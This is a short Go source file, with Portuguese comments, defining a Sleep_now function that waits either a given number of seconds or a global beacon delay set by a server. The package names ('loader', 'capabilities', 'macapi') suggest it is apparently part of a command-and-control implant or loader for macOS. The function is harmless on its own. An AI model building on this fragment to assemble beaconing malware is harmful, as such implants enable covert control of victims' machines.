package capabilities

import (
	global "loader/utils"
	"loader/utils/macapi"
)

// Sleep_now — nim loader sleep_now: sem args = beacon global; com arg = segundos fixos.
// No loader o BeaconDelay chega em milissegundos (prep do server grava sleep*1000).
func Sleep_now(seconds ...int) {
	// Receives optional seconds and sleeps for that time or the global beacon delay
	ms := uint64(5000)
	if len(seconds) > 0 {
		ms = uint64(seconds[0]) * 1000
	} else if global.BeaconDelay > 0 {
		ms = uint64(global.BeaconDelay)
	}
	macapi.SleepMs(ms)
}